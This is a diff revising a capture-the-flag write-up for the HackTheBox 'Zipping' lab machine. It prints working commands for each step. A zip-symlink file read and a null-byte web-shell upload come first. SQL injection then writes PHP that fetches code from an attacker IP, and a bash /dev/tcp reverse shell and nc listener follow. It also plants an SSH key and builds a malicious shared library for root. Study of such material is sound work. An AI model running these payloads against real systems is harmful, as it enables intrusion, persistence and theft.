@@ -74,7 +74,6 @@ There is no specific hostname at this point.
 
 Let's continue by by enumerating directory entries :
 
-
 ```shell
 USERAGENT="PENTEST"
 WORDLIST_DIR=/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
@@ -167,17 +166,17 @@ There are some interesting folders :
 
 Now let's browse this web site : [http://10.10.11.229/](http://10.10.11.229/)
 
-![Untitled](Untitled.png)
+![Untitled](hackthebox/medium/zipping/assets/web_home.png)
 
 When scrolling at the bottom of the page :
 
-![Untitled](Untitled%201.png)
+![Untitled](zipping_contact.png)
 
 There is also a page “Work with us” :
 
 [http://10.10.11.229/upload.php](http://10.10.11.229/upload.php)
 
-![Untitled](Untitled%202.png)
+![Untitled](zipping_upload.png)
 
 This form is aimed at uploading a CV :
 
@@ -196,29 +195,22 @@ zip cv.zip header.jpg.pdf
 
 Then upload cv.zip
 
-![Untitled](Untitled%203.png)
+![Untitled](zipping_upload_ok.png)
 
-
-
+The link provided : 
 [http://10.10.11.229/uploads/3d395417744dd37f4b63c93a27265ea8/header.jpg.pdf](http://10.10.11.229/uploads/3d395417744dd37f4b63c93a27265ea8/header.jpg.pdf)
 
-
-
-### Information founds
-
-| port | service | Software/version |
-| ---  | ---     | ---              |
-|      |         |                  |
+This file goes into the `uploads` folder previously discovered.
 
 ## Initial access
 
-### Exploitation
+### Exploitation - zipping
 
 Let’s try to exploit this file upload !
 
-[https://book.hacktricks.xyz/pentesting-web/file-upload#zip-tar-file-automatically-decompressed-upload](https://book.hacktricks.xyz/pentesting-web/file-upload#zip-tar-file-automatically-decompressed-upload)
+Reference: [https://book.hacktricks.xyz/pentesting-web/file-upload#zip-tar-file-automatically-decompressed-upload](https://book.hacktricks.xyz/pentesting-web/file-upload#zip-tar-file-automatically-decompressed-upload)
 
-with a relative path :
+We can try to upload a zip file containing a link, with a relative path :
 
 
 ```
@@ -227,19 +219,23 @@ ln -sf ../upload.php cv.pdf
 zip --symlinks cv.zip cv.pdf
 ```
 
-do not work.
+This do not work. Let's try with an absolute path :
 
-```
+```shell
 rm cv.*
 ln -sf /etc/passwd cv.pdf
 zip --symlinks cv.zip cv.pdf
 ```
 
+This works, and we can download the file with :
+
 ```
 curl -v http://$TARGET/uploads/d8c9023426049da7c56c5b502f7c154c/cv.pdf
 ```
 
-```
+We have found a LFI vulnerability :
+
+```text
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -269,13 +265,15 @@ mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
 _laurel:x:999:999::/var/log/laurel:/bin/false
 ```
 
-we can note a user :
+We can note a user :
 
 ```text
 rektsu:x:1001:1001::/home/rektsu:/bin/bash
 ```
 
-try with an absolute path, based on default path served by Apache httpd :
+There is also a mysql user, so a mysql service should be running.
+
+We can continue to get some file content with an absolute path, based on default path served by Apache httpd :
 
 ```shell
 rm cv.*
@@ -283,6 +281,7 @@ ln -sf /var/www/html/upload.php cv.pdf
 zip --symlinks cv.zip cv.pdf
 ```
 
+The uploads is working and we can download the file with :
 
 ```shell
 curl -v http://$TARGET/uploads/b5bcc5e3985b468a4c4424543d37e676/cv.pdf
@@ -441,7 +440,7 @@ curl -v http://$TARGET/uploads/b5bcc5e3985b468a4c4424543d37e676/cv.pdf
 </html>
 ```
 
-same with index.php :
+And same with `index.php` file :
 
 ```shell
 rm cv.*
@@ -767,7 +766,7 @@ zip --symlinks cv.zip cv.pdf
 </html>
 ```
 
-Automate the process of this LFI :
+We can automate the process of this LFI with this bash script :
 
 ```shell
 REMOTE_HTTP_PATH=/var/www/html/
@@ -796,27 +795,27 @@ for Filename in ${Filenames}; do
 done
 ```
 
-In the upload.php, the only protection is a filter on the extension name :
+In the `upload.php`, the only protection is a filter on the extension name :
 
 ```php
 if (pathinfo($fileName, PATHINFO_EXTENSION) === "pdf") {
 ```
 
-we also have the uncompress command :
+We also have the uncompress command that is calling `7z` application :
 
 ```php
 echo exec('7z e '.$zipFile. ' -o' .$uploadPath. '>/dev/null');
 ```
 
-the extension check could be bypassed with a null byte : file.php[null].pdf
+The extension check could be bypassed with a null byte : `file.php[null byte].pdf`
 
-shell.php:
+Let's use `shell.php`, that will execute a simple command:
 
 ```php
 <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
 ```
 
-pdf_archiver.py :
+We can craft `pdf_archiver.py` that will archive this file :
 
 ```python
 import zipfile
@@ -831,38 +830,40 @@ with zipfile.ZipFile(zipname, mode='w') as archive:
     archive.write(filename, arcname=zipfilename)
 ```
 
+Create the archive :
+
+```shell
 python3 ./pdf_archiver.py
+```
 
-upload the zip file :
+Then upload the zip file :
 
-![Untitled](Untitled%204.png)
+![Untitled](zipping_upload_shell.png)
 
-Using burpsuite, repeat the POST request.
+Using `burpsuite`, repeat the action and intercept POST request :
 
-![Untitled](Untitled%205.png)
+![Untitled](burpsuite_post.png)
 
 Switch in Hex mode :
 
-![Untitled](Untitled%206.png)
+![Untitled](burpsuite_post_hex.png)
 
 Replace the ‘A’ by ‘00’ in order to introduce a null byt in that filename
 
-![Untitled](Untitled%207.png)
+![Untitled](burpsuite_post_hex_null.png)
 
 Then send the request. The zip file must be accepted :
 
-![Untitled](Untitled%208.png)
+![Untitled](burpsuite_post_reply.png)
 
-Automate it :
-
-upload.sh
+Automate it with a script `upload.sh` :
 
 ```bash
 #!/bin/bash
 
 inputZip=/root/cv.zip
 
-CURL_PROXY="--proxy http://127.0.0.1:8080"
+#CURL_PROXY="--proxy http://127.0.0.1:8080" # burpsuite proxy, for debug
 CURL_PROXY=""
 
 Response=""
@@ -870,6 +871,7 @@ Response=$( curl -s $CURL_PROXY -X POST -F "zipFile=@${inputZip}" http://${TARGE
 
 #echo ${Response}
 
+# extract the target link
 UploadItem=""
 UploadItem=$( echo $Response | grep -Eo "uploads\/[a-z0-9]*\/[a-z\.]*\.php.\.pdf" | head -n 1)
 echo ${UploadItem}
@@ -879,11 +881,13 @@ echo ${UploadItem}
 curl http://${TARGET}/${UploadItem}
 ```
 
-[http://10.10.11.229/](http://10.10.11.229/)shop/
+### Exploitation - shop
 
-![Untitled](Untitled%209.png)
+[http://10.10.11.229/shop/]((http://10.10.11.229//shop)
 
-We can use the LFI to read the code behind this page :
+![Untitled](shop_home.png)
+
+We can use the LFI to read the code behind this page, located in the `shop` folder :
 
 ```bash
 #!/bin/bash
@@ -913,7 +917,7 @@ echo ${UploadItem}
 curl http://${TARGET}/${UploadItem}
 ```
 
-index.php :
+`index.php` :
 
 ```bash
 <?php
@@ -928,7 +932,7 @@ include $page . '.php';
 ?>
 ```
 
-same with functions.php :
+same with `functions.php` :
 
 ```bash
 #!/bin/bash
@@ -1021,27 +1025,29 @@ EOT;
 ?>
 ```
 
-note the database credential :
+We can note the database credential :
 
+```text
     $DATABASE_USER = 'root';
     $DATABASE_PASS = 'MySQL_P@ssw0rd!';
     $DATABASE_NAME = 'zipping';
+```
 
 When selecting a product, we are directed to this page :
 
 [http://10.10.11.229/shop/index.php?page=product&id=3](http://10.10.11.229/shop/index.php?page=product&id=3)
 
-![Untitled](Untitled%2010.png)
+![Untitled](shop_product.png)
 
 There is also the cart page :
 
 [http://10.10.11.229/shop/index.php?page=cart](http://10.10.11.229/shop/index.php?page=cart)
 
-![Untitled](Untitled%2011.png)
+![Untitled](shop_cart.png)
 
-From the URL, this redirect to page “cart.php”, and “product.php” :
+From the URL, this redirect to page `cart.php`, and `product.php`. we can use the LFI again to explore theses files in the `shop` folder :
 
-product.php:
+`product.php` :
 
 ```php
 <?php
@@ -1095,7 +1101,7 @@ if (isset($_GET['id'])) {
 <?=template_footer()?>
 ```
 
-cart.php:
+`cart.php` :
 
 ```php
 <?php
@@ -1256,103 +1262,77 @@ if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $id, $
 
 This regex will consider the input page is not valid if any of the condition is verified :
 
-- invalid character : [A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]
-- or not a digit: [^0-9]
+- containing invalid character : `[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]`
+- or not ending with a digit: `[^0-9]$`
 
-[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match-](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match-).
+Reference: [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match-](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#preg_match-).
 
-we could use line feed to escape this filter
+we could use line feed to escape this filter. 
 
-We can execute system commands with this :
+Since the product id is directly used in a SQL query, we can execute system commands with this :
 
 [https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#mysql](https://sqlwiki.netspi.com/attackQueries/executingOSCommands/#mysql)
 
-From :
+From : [http://10.10.11.229/shop/index.php?page=product&id=3](http://10.10.11.229/shop/index.php?page=product&id=3)
 
-[http://10.10.11.229/shop/index.php?page=product&id=3](http://10.10.11.229/shop/index.php?page=product&id=3)
+we could use a payload looking like :
 
-we could use a payload :
-
-```php
+```sql
 <line feed>
-';select '<?php system("curl -s http://10.10.14.23:9090/shell.php"); ?>' into outfile '/var/lib/mysql/shell.php' #1
+';select '<?php system("curl -s http://10.10.14.23:9090/shell.php"); ?>' into outfile '/path_to/shell.php' #1
 ```
 
-Then call this PHP page
+The line-feed will escape the first filter, and the trailing number will escape the second filter.
 
-[http://10.10.11.229/shop/index.php?page=](http://10.10.11.229/shop/index.php?page=product&id=3)/var/www/shell.php
+This will write a PHP file `shell.php`, from the mysql service (mysql user). When executed, this PHP file will download an other PHP file `shell.php`.
+
+With this exploit, we could then call this PHP page like : [http://10.10.11.229/shop/index.php?page=/path_to/shell.php](http://10.10.11.229/shop/index.php?page=/path_to/shell.php)
+
+In order to provide this payload in the URL, we can use cyberchef to URL Encode this payload (Encode all special chars) :
 
 ```php
-cyberchef
-
-URL Encode
-
-Encode all special chars
-
 %0A%27%3Bselect%20%27%3C%3Fphp%20system%28%22curl%20%2Ds%20http%3A%2F%2F10%2E10%2E14%2E23%3A9090%2Fshell%2Ephp%22%29%3B%20%3F%3E%27%20into%20outfile%20%27%2Fvar%2Flib%2Fmysql%2Fshell%2Ephp%27%20%231
 ```
 
-according to the regex filter, we should end the request with a digit
+Since this is the mysql user that will write the file, it should not have write access to `/var/www/`. instead, we can use the folder `/var/lib/mysql` that this user should have write access.
 
-Product does not exist!
+As a result, when calling, we have a response : "Product does not exist!" :
 
-![Untitled](Untitled%2012.png)
+![Untitled](shop_exploit.png)
 
-Calling the payload :
+We can try to calli the payload :
 
-curl '[http://10.10.11.229/shop/index.php?page=../../../../../../../../../var/lib/mysql/shell.php](http://10.10.11.229/shop/index.php?page=../../../../../../../../../var/lib/mysql/shell.php)'
+```shell
+curl 'http://10.10.11.229/shop/index.php?page=../../../../../../../../../var/lib/mysql/shell.php
+```
 
-has no effect …
+but this do not seem to work (receive no HTTP on our attacker box).
 
+we can simply it and use a ping command :
+
+```text
 GET /shop/index.php?page=product&id=%0a';select+'<%3fphp+system("ping+10.10.14.23");%3f>'+into+outfile+'/var/lib/mysql/shell44.php'+%231 HTTP/1.1
-
-curl -v '[http://10.10.11.229/shop/index.php?page=../../../../../../var/lib/mysql/shell44](http://10.10.11.229/shop/index.php?page=../../../../../../var/lib/mysql/shell44)'
-
-OK !
-
-tcpdump -i tun0 -X 
-
-curl -v '[http://10.10.11.229/shop/index.php?page=/var/lib/mysql/shell44](http://10.10.11.229/shop/index.php?page=/var/lib/mysql/shell44)'
-
-OK too
-
-GET /shop/index.php?page=product&id=%0a';select+'<%3fphp+system("curl+http://10.10.14.23:9090/shell.php");%3f>'+into+outfile+'/var/lib/mysql/shell45.php'+%231 HTTP/1.1
-
-OK too
-
-can only write in /var/lib/mysql/
-
-```php
-bash -i >& /dev/tcp/10.10.14.23/9001 0>&1
 ```
 
-[https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
+Then call it :
 
-URL encoded:
-
-```php
-bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E14%2E23%2F9001%200%3E%261%0A
+```shell
+curl -v 'http://10.10.11.229/shop/index.php?page=../../../../../../var/lib/mysql/shell44'
 ```
 
-GET /shop/index.php?page=product&id=%0a';select+'<%3fphp+%24sock%3Dfsockopen%28%2210%2E10%2E14%2E23%22%2C9001%29%3Bsystem%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%3f>'+into+outfile+'/var/www/html/uploads/shell47.php'+%231 HTTP/1.1
+We can use tcpdump and see that we have some incoming ping requests ! this works !
 
-rlwrap -cAr nc -lvnp 9001
+Same with an absolute path when calling the exploit :
 
-curl -v '[http://10.10.11.229/shop/index.php?page=/var/lib/mysql/shell47](http://10.10.11.229/shop/index.php?page=/var/lib/mysql/shell47)'
-
-```php
-echo 'sh -i >& /dev/tcp/10.10.14.23/9001 0>&1' > shell
+```shell
+curl -v 'http://10.10.11.229/shop/index.php?page=/var/lib/mysql/shell44'
 ```
 
-GET /shop/index.php?page=product&id=%0a';select+'<%3fphp+system("curl+-s+http://10.10.14.23:9090/shell|bash");%3f>'+into+outfile+'/var/lib/mysql/shell53.php'+%231 HTTP/1.1
+This is OK too
 
-updog
+Now we want to execute some real command, and move for a reverse shell.
 
-curl -v '[http://10.10.11.229/shop/index.php?page=/var/lib/mysql/shell53](http://10.10.11.229/shop/index.php?page=/var/lib/mysql/shell53)'
-
-rlwrap -cAr nc -lvnp 9001
-
-Automate it !
+Let's automate it !
 
 ```bash
 
@@ -1366,41 +1346,49 @@ curl -s "http://10.10.11.229/shop/index.php?page=product&id=%0a';select+'<%3fphp
 curl -v "http://10.10.11.229/shop/index.php?page=/var/lib/mysql/shell${Id}"
 ```
 
-serve with updog (on port 9090
+serve with `updog` (on port 9090)
 
-revshell listener :
+start a listener :
 
-```bash
+```shell
 rlwrap -cAr nc -lvnp 9001
 ```
 
-![Untitled](Untitled%2013.png)
+When executing, we have a working reverse shell :
+
+![Untitled](user_shell.png)
 
 ### Maintaining access
 
-port 22 is open for ssh access. let’s generate access keys !
+Since port 22 is open for ssh access. let’s generate access keys !
 
+```shell
 ssh-keygen -t rsa -b 4096 -f zipping
+```
 
-```bash
+```shell
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDW3/K2CicO+BRWzePGBgDNxP+0TG0nn7xkg8JtExMsTmdxu6eLGUV6g/STiHdKRymOiojGc4oW/YgWM+of7AFADFcoXOasZPUYot6+vf/hWCfdki6KN5/E6yCfFKtCIDgP/GFaDnSaqYz+dJvfJm3Lo0/0pr1/CwEHDNbnc/iQAaf8kdXB7J6mvwfx57TlcH0AtM8gClIM9qYWrhIXkJUtP8nblgZDYgqyxIfT2YuCWc3P8YeR1QgNqkZsW8MIAa26OPaEqmZHJqyDDB1jGiu+bvWKh+JuzoAt2szwqtPCuRmoATG1Xl+SmjhlNWlP0CxvE4at0MjN1r6AZ2OpGrC/BOBaUcfI//u5xEhHJaAZ/1ARgeFmuWkHTpsj6fX6ftsuIqcpJx0Ph38D8Zo4gi9Qg2m41vo6tfTchdbDkRdV/+ZV/67y9H+BfuEQgSHnuZLZtwJlvs6P/eqZaBMmDVNInQP6/V4m2GUQBim1+wd6FgVh6yWhvo285nZK8NYL1/MVyjE4yxr/Fl1ljWPRHDhqlZyHz/HAHh0rSGiuQIqfgaN1bFSJ8CCqOZSgHF/My53SgUQCKIAy0Xlp7e8tmkpvc0yUygx7pssmphZ6rKkxTP5hW7Iix9kO8dTwA3sxe4zBDmdY687/1PBnencWhH1W7Ur2gVlo6R6zOX2OkNQBzw== root@exegol-htb" >> /home/rektsu/.ssh/authorized_keys
 ```
 
-ssh [rektsu@10.10.11.229](mailto:rektsu@10.10.11.229) -i zipping
+and open the connection :
 
+```shell
+ssh [rektsu@10.10.11.229](mailto:rektsu@10.10.11.229) -i zipping
+```
 
 ## Post-Exploitation
 
 ### Host Reconnaissance
 
+We are on current user : rektsu
 
-current user : rektsu
+Let's watch sudo rights:
 
-```bash
+```shell
 sudo -l
 ```
 
-```bash
+```text
 Matching Defaults entries for rektsu on zipping:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -1409,14 +1397,23 @@ User rektsu may run the following commands on zipping:
     (ALL) NOPASSWD: /usr/bin/stock
 ```
 
+What is this `stock` ?
+
+```shell
 file  /usr/bin/stock
+```
+
+```text
 /usr/bin/stock: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=aa34d8030176fe286f8011c9d4470714d188ab42, for GNU/Linux 3.2.0, not stripped
+```
 
-a binary file
+This a binary file, not a script, so let's see it's internal strings to get a quick averview :
 
+```shell
 string /usr/bin/stock
+```
 
-```bash
+```text
 PTE1
 u+UH
 Hakaize
@@ -1452,20 +1449,22 @@ The stock has been updated correctly.
 ;*3$"
 ```
 
-strange:
+This application will request a password ("Enter the password:"). We can find some strange strings (clear passwords ?) :
 
 ```bash
 Hakaize
 St0ckM4nager
 ```
 
-This seems to manage the stock for the shop, with a CSV file /root/.stock.csv
+This seems to manage the stock for the shop, with a CSV file `/root/.stock.csv`.
 
+Now, let's go deeper in this executable, and show what it does, what is hudden :
 
-
+```shell
 strace stock
+```
 
-```bash
+```text
 execve("/usr/bin/stock", ["stock"], 0x7ffc79a86750 /* 20 vars */) = 0
 brk(NULL)                               = 0x56280eca5000
 arch_prctl(0x3001 /* ARCH_??? */, 0x7ffc51642820) = -1 EINVAL (Invalid argument)
@@ -1524,19 +1523,18 @@ read(0,
 
 We notice:
 
-```bash
+```text
 openat(AT_FDCWD, "/home/rektsu/.config/libcounter.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
 ```
 
 ### Privilege Escalation
 
-try to load a library
+Since the `stock` application is trying to load a library, we can build a library that will execute some code when loaded.
 
-build a library that will execute some code when loaded.
+Reference: [https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path)
 
-[https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path)
-
-```bash
+```shell
+# generate the C code
 cat <<EOF > x.c
 > #include <stdio.h>
 #include <sys/types.h>
@@ -1550,19 +1548,17 @@ void _init() {
 }
 > EOF
 
+# compile
 gcc -fPIC -shared -o /home/rektsu/.config/libcounter.so x.c -nostartfiles
-x.c: In function ‘_init’:
-x.c:7:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
-    7 |     setgid(0);
-      |     ^~~~~~
-x.c:8:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
-    8 |     setuid(0);
-      |     ^~~~~~
 ```
 
-sudo stock
+There are a few compilation warning, but that's OK. We can execute this application with sudo to get a shell :
 
-![Untitled](Untitled%2014.png)
+```shell
+sudo stock
+```
+
+![Untitled](root_shell.png)
 
 
 
